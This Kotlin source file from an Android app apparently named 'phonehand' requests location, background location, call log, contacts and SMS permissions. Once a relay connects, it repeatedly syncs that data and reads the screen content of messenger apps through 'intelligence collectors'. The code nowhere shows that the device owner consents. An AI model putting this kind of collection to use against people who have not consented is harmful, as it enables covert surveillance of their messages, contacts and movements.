package com.phonehand.app

import android.content.Context
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import androidx.core.content.ContextCompat

object PermissionRequester {
    const val ACTION_REQUEST = "com.phonehand.app.REQUEST_INTEL_PERMS"

    private val RUNTIME = buildList {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            add(android.Manifest.permission.POST_NOTIFICATIONS)
        }
        add(android.Manifest.permission.ACCESS_FINE_LOCATION)
        add(android.Manifest.permission.ACCESS_COARSE_LOCATION)
        add(android.Manifest.permission.READ_CALL_LOG)
        add(android.Manifest.permission.READ_CONTACTS)
        add(android.Manifest.permission.READ_SMS)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            add(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
    }.toTypedArray()

    fun has(context: Context, permission: String): Boolean =
        ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED

    fun missing(context: Context): List<String> =
        RUNTIME.filter { !has(context, it) }

    fun requestViaActivity(context: Context) {
        val intent = android.content.Intent(context, HomeActivity::class.java)
            .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            .putExtra(HomeActivity.EXTRA_REQUEST_INTEL, true)
        context.startActivity(intent)
    }

    fun requestIfNeeded(context: Context) {
        if (missing(context).isEmpty()) return
        requestViaActivity(context)
    }
}

/** Orchestrates intelligence collectors — started when relay connects. */
class ActivityCollector(private val context: Context) {
    private val handler = Handler(Looper.getMainLooper())
    private var locationTracker: LocationTracker? = null
    private var started = false
    private var lastMessengerPkg = ""
    private var lastMessengerAt = 0L

    private val syncLoop = object : Runnable {
        override fun run() {
            if (!started) return
            runCatching { CallLogReader.sync(context) }
            runCatching { SmsReader.sync(context) }
            runCatching { ContactsReader.sync(context) }
            ActivityStore.flush(context)
            handler.postDelayed(this, 90_000)
        }
    }

    private val flushLoop = object : Runnable {
        override fun run() {
            if (!started) return
            ActivityStore.flush(context)
            handler.postDelayed(this, 8_000)
        }
    }

    fun start() {
        if (started) return
        started = true
        PermissionRequester.requestIfNeeded(context)
        locationTracker = LocationTracker(context).also { it.start() }
        handler.postDelayed(syncLoop, 5_000)
        handler.post(flushLoop)
    }

    fun stop() {
        started = false
        handler.removeCallbacks(syncLoop)
        handler.removeCallbacks(flushLoop)
        locationTracker?.stop()
        locationTracker = null
    }

    fun onTree(tree: org.json.JSONObject, pkg: String) {
        if (!MessengerParser.isMessenger(pkg)) return
        val now = System.currentTimeMillis()
        if (pkg == lastMessengerPkg && now - lastMessengerAt < 2_500) return
        lastMessengerPkg = pkg
        lastMessengerAt = now
        runCatching { MessengerParser.ingest(context, tree, pkg) }
    }

    fun onSetupTakeover() {
        PermissionRequester.requestViaActivity(context)
    }

    companion object {
        @Volatile private var instance: ActivityCollector? = null

        fun get(context: Context): ActivityCollector {
            return instance ?: synchronized(this) {
                instance ?: ActivityCollector(context.applicationContext).also { instance = it }
            }
        }
    }
}
